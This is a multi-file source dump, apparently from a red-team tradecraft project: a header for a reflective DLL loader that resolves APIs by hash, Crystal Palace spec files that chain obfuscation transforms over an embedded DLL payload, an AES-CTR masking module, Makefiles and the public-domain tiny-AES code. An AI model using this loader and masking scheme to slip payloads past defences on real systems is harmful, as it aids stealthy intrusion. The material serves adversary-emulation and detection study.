} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_rdll_transforms/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_transforms/loader.spec

```text
name        "Simple rDLL - Content Transformations"
describe    "Modular loader which demonstrates chained content transformations"
author      "Adversary Fan Fiction Writers Guild"
license     "BSD"
reference   "https://tradecraftgarden.org/simpletransform.html"

defval      "%transforms" "List of transform modules" ""
defraw      "$DLL"        "DLL capability"

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst +optimize

		# bring in PIC services module
		run "../simple_pic/services.spec"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# apply our various obfuscation modules to this loader
		foreach %transforms : call %_ "init"

		# load our Reflective DLL argument AND link it into our PIC as my_data section
		push $DLL
			# call each module and let it apply it's transformations to our data
			foreach %transforms : call %_ "apply"

			# prepend the length of our DLL content
			preplen

			# link it
			link "my_data"
	
		# we're done, export the final blob
		export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		run "../simple_pic/services.spec"
		mergelib "../libtcg/libtcg.x64.zip"

		foreach %transforms : call %_ "init"

		push $DLL
			foreach %transforms : call %_ "apply"
			preplen
			link "my_data"

		export

```

## File: simple_rdll_transforms/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_transforms/modules/aes/aes.spec

```text
#
# AES-CTR data encoding module
#

# 'init' is called by loader.spec and is our opportunity to merge in code
# and set any global values we need to set.
init.x86:
	# merge in code for AES recovery
	load "bin/recover.x86.o"
		merge

	# bring in our AES code too
	load "bin/aes.x86.o"
		merge

	# layer our xor recovery function over recover
	redirect "_recover" "_aes_recover"

	# patch in the AES key for our module too
	generate $AES_KEY 16
	patch "_aeskey" $AES_KEY

init.x64:
	load "bin/recover.x64.o"
		merge

	load "bin/aes.x64.o"
		merge

	redirect "recover" "aes_recover"

	generate $AES_KEY 16
	patch "aeskey" $AES_KEY

# 'apply' is called by loader.spec and is our opportunity to encode the data
apply.x86:
	mask "aes-ctr" $AES_KEY

apply.x64:
	mask "aes-ctr" $AES_KEY

```

## File: simple_rdll_transforms/modules/aes/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_transforms/modules/aes/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/recover.c -o bin/recover.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/aes.c -o bin/aes.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/recover.c -o bin/recover.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/aes.c -o bin/aes.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_transforms/modules/aes/src/aes.c

```c
// Tiny AES in C (public domain) https://github.com/kokke/tiny-AES-c
// Modifications: disabled optimizations on KeyExpansion for x86

/*

This is an implementation of the AES algorithm, specifically ECB, CTR and CBC mode.
Block size can be chosen in aes.h - available choices are AES128, AES192, AES256.

The implementation is verified against the test vectors in:
  National Institute of Standards and Technology Special Publication 800-38A 2001 ED

ECB-AES128
----------

  plain-text:
    6bc1bee22e409f96e93d7e117393172a
    ae2d8a571e03ac9c9eb76fac45af8e51
    30c81c46a35ce411e5fbc1191a0a52ef
    f69f2445df4f9b17ad2b417be66c3710

  key:
    2b7e151628aed2a6abf7158809cf4f3c

  resulting cipher
    3ad77bb40d7a3660a89ecaf32466ef97 
    f5d3d58503b9699de785895a96fdbaaf 
    43b1cd7f598ece23881b00e3ed030688 
    7b0c785e27e8ad3f8223207104725dd4 


NOTE:   String length must be evenly divisible by 16byte (str_len % 16 == 0)
        You should pad the end of the string with zeros if this is not the case.
        For AES192/256 the key size is proportionally larger.

*/


/*****************************************************************************/
/* Includes:                                                                 */
/*****************************************************************************/
#include <string.h> // CBC mode, for memset
#include "aes.h"

/*****************************************************************************/
/* Defines:                                                                  */
/*****************************************************************************/
// The number of columns comprising a state in AES. This is a constant in AES. Value=4
#define Nb 4

#if defined(AES256) && (AES256 == 1)
    #define Nk 8
    #define Nr 14
#elif defined(AES192) && (AES192 == 1)
    #define Nk 6
    #define Nr 12
#else
    #define Nk 4        // The number of 32 bit words in a key.
    #define Nr 10       // The number of rounds in AES Cipher.
#endif

// jcallan@github points out that declaring Multiply as a function 
// reduces code size considerably with the Keil ARM compiler.
// See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3
#ifndef MULTIPLY_AS_A_FUNCTION
  #define MULTIPLY_AS_A_FUNCTION 0
#endif




/*****************************************************************************/
/* Private variables:                                                        */
/*****************************************************************************/
// state - array holding the intermediate results during decryption.
typedef uint8_t state_t[4][4];



// The lookup-tables are marked const so they can be placed in read-only storage instead of RAM
// The numbers below can be computed dynamically trading ROM for RAM - 
// This can be useful in (embedded) bootloader applications, where ROM is often limited.
static const uint8_t sbox[256] = {
  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
  0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
  0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
  0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
  0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
  0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
  0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
  0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
  0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
  0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
  0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
  0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
  0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
  0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
  0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
  0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
  0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 };

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
static const uint8_t rsbox[256] = {
  0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
  0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
  0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
  0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
  0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
  0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
  0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
  0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
  0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
  0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
  0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
  0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
  0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
  0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
  0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
  0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d };
#endif

// The round constant word array, Rcon[i], contains the values given by 
// x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8)
static const uint8_t Rcon[11] = {
  0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };

/*
 * Jordan Goulder points out in PR #12 (https://github.com/kokke/tiny-AES-C/pull/12),
 * that you can remove most of the elements in the Rcon array, because they are unused.
 *
 * From Wikipedia's article on the Rijndael key schedule @ https://en.wikipedia.org/wiki/Rijndael_key_schedule#Rcon
 * 
 * "Only the first some of these constants are actually used – up to rcon[10] for AES-128 (as 11 round keys are needed), 
 *  up to rcon[8] for AES-192, up to rcon[7] for AES-256. rcon[0] is not used in AES algorithm."
 */


/*****************************************************************************/
/* Private functions:                                                        */
/*****************************************************************************/
/*
static uint8_t getSBoxValue(uint8_t num)
{
  return sbox[num];
}
*/
#define getSBoxValue(num) (sbox[(num)])

// This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. 
#ifdef WIN_X86
__attribute__((optimize("O0")))
#endif
static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
{
  unsigned i, j, k;
  uint8_t tempa[4]; // Used for the column/row operations
  
  // The first round key is the key itself.
  for (i = 0; i < Nk; ++i)
  {
    RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];
    RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];
    RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];
    RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];
  }

  // All other round keys are found from the previous round keys.
  for (i = Nk; i < Nb * (Nr + 1); ++i)
  {
    {
      k = (i - 1) * 4;
      tempa[0]=RoundKey[k + 0];
      tempa[1]=RoundKey[k + 1];
      tempa[2]=RoundKey[k + 2];
      tempa[3]=RoundKey[k + 3];

    }

    if (i % Nk == 0)
    {
      // This function shifts the 4 bytes in a word to the left once.
      // [a0,a1,a2,a3] becomes [a1,a2,a3,a0]

      // Function RotWord()
      {
        const uint8_t u8tmp = tempa[0];
        tempa[0] = tempa[1];
        tempa[1] = tempa[2];
        tempa[2] = tempa[3];
        tempa[3] = u8tmp;
      }

      // SubWord() is a function that takes a four-byte input word and 
      // applies the S-box to each of the four bytes to produce an output word.

      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }

      tempa[0] = tempa[0] ^ Rcon[i/Nk];
    }
#if defined(AES256) && (AES256 == 1)
    if (i % Nk == 4)
    {
      // Function Subword()
      {
        tempa[0] = getSBoxValue(tempa[0]);
        tempa[1] = getSBoxValue(tempa[1]);
        tempa[2] = getSBoxValue(tempa[2]);
        tempa[3] = getSBoxValue(tempa[3]);
      }
    }
#endif
    j = i * 4; k=(i - Nk) * 4;
    RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
    RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
    RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
    RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
  }
}

void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)
{
  KeyExpansion(ctx->RoundKey, key);
}
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)
{
  KeyExpansion(ctx->RoundKey, key);
  memcpy (ctx->Iv, iv, AES_BLOCKLEN);
}
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)
{
  memcpy (ctx->Iv, iv, AES_BLOCKLEN);
}
#endif

// This function adds the round key to state.
// The round key is added to the state by an XOR function.
static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)
{
  uint8_t i,j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j];
    }
  }
}

// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void SubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[j][i] = getSBoxValue((*state)[j][i]);
    }
  }
}

// The ShiftRows() function shifts the rows in the state to the left.
// Each row is shifted with different offset.
// Offset = Row number. So the first row is not shifted.
static void ShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to left  
  temp           = (*state)[0][1];
  (*state)[0][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[3][1];
  (*state)[3][1] = temp;

  // Rotate second row 2 columns to left  
  temp           = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp           = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to left
  temp           = (*state)[0][3];
  (*state)[0][3] = (*state)[3][3];
  (*state)[3][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[1][3];
  (*state)[1][3] = temp;
}

static uint8_t xtime(uint8_t x)
{
  return ((x<<1) ^ (((x>>7) & 1) * 0x1b));
}

// MixColumns function mixes the columns of the state matrix
static void MixColumns(state_t* state)
{
  uint8_t i;
  uint8_t Tmp, Tm, t;
  for (i = 0; i < 4; ++i)
  {  
    t   = (*state)[i][0];
    Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3] ;
    Tm  = (*state)[i][0] ^ (*state)[i][1] ; Tm = xtime(Tm);  (*state)[i][0] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][1] ^ (*state)[i][2] ; Tm = xtime(Tm);  (*state)[i][1] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][2] ^ (*state)[i][3] ; Tm = xtime(Tm);  (*state)[i][2] ^= Tm ^ Tmp ;
    Tm  = (*state)[i][3] ^ t ;              Tm = xtime(Tm);  (*state)[i][3] ^= Tm ^ Tmp ;
  }
}

// Multiply is used to multiply numbers in the field GF(2^8)
// Note: The last call to xtime() is unneeded, but often ends up generating a smaller binary
//       The compiler seems to be able to vectorize the operation better this way.
//       See https://github.com/kokke/tiny-AES-c/pull/34
#if MULTIPLY_AS_A_FUNCTION
static uint8_t Multiply(uint8_t x, uint8_t y)
{
  return (((y & 1) * x) ^
       ((y>>1 & 1) * xtime(x)) ^
       ((y>>2 & 1) * xtime(xtime(x))) ^
       ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^
       ((y>>4 & 1) * xtime(xtime(xtime(xtime(x)))))); /* this last call to xtime() can be omitted */
  }
#else
#define Multiply(x, y)                                \
      (  ((y & 1) * x) ^                              \
      ((y>>1 & 1) * xtime(x)) ^                       \
      ((y>>2 & 1) * xtime(xtime(x))) ^                \
      ((y>>3 & 1) * xtime(xtime(xtime(x)))) ^         \
      ((y>>4 & 1) * xtime(xtime(xtime(xtime(x))))))   \

#endif

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
/*
static uint8_t getSBoxInvert(uint8_t num)
{
  return rsbox[num];
}
*/
#define getSBoxInvert(num) (rsbox[(num)])

// MixColumns function mixes the columns of the state matrix.
// The method used to multiply may be difficult to understand for the inexperienced.
// Please use the references to gain more information.
static void InvMixColumns(state_t* state)
{
  int i;
  uint8_t a, b, c, d;
  for (i = 0; i < 4; ++i)
  { 
    a = (*state)[i][0];
    b = (*state)[i][1];
    c = (*state)[i][2];
    d = (*state)[i][3];

    (*state)[i][0] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09);
    (*state)[i][1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d);
    (*state)[i][2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b);
    (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e);
  }
}


// The SubBytes Function Substitutes the values in the
// state matrix with values in an S-box.
static void InvSubBytes(state_t* state)
{
  uint8_t i, j;
  for (i = 0; i < 4; ++i)
  {
    for (j = 0; j < 4; ++j)
    {
      (*state)[j][i] = getSBoxInvert((*state)[j][i]);
    }
  }
}

static void InvShiftRows(state_t* state)
{
  uint8_t temp;

  // Rotate first row 1 columns to right  
  temp = (*state)[3][1];
  (*state)[3][1] = (*state)[2][1];
  (*state)[2][1] = (*state)[1][1];
  (*state)[1][1] = (*state)[0][1];
  (*state)[0][1] = temp;

  // Rotate second row 2 columns to right 
  temp = (*state)[0][2];
  (*state)[0][2] = (*state)[2][2];
  (*state)[2][2] = temp;

  temp = (*state)[1][2];
  (*state)[1][2] = (*state)[3][2];
  (*state)[3][2] = temp;

  // Rotate third row 3 columns to right
  temp = (*state)[0][3];
  (*state)[0][3] = (*state)[1][3];
  (*state)[1][3] = (*state)[2][3];
  (*state)[2][3] = (*state)[3][3];
  (*state)[3][3] = temp;
}
#endif // #if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)

// Cipher is the main function that encrypts the PlainText.
static void Cipher(state_t* state, const uint8_t* RoundKey)
{
  uint8_t round = 0;

  // Add the First round key to the state before starting the rounds.
  AddRoundKey(0, state, RoundKey);

  // There will be Nr rounds.
  // The first Nr-1 rounds are identical.
  // These Nr rounds are executed in the loop below.
  // Last one without MixColumns()
  for (round = 1; ; ++round)
  {
    SubBytes(state);
    ShiftRows(state);
    if (round == Nr) {
      break;
    }
    MixColumns(state);
    AddRoundKey(round, state, RoundKey);
  }
  // Add round key to last round
  AddRoundKey(Nr, state, RoundKey);
}

#if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
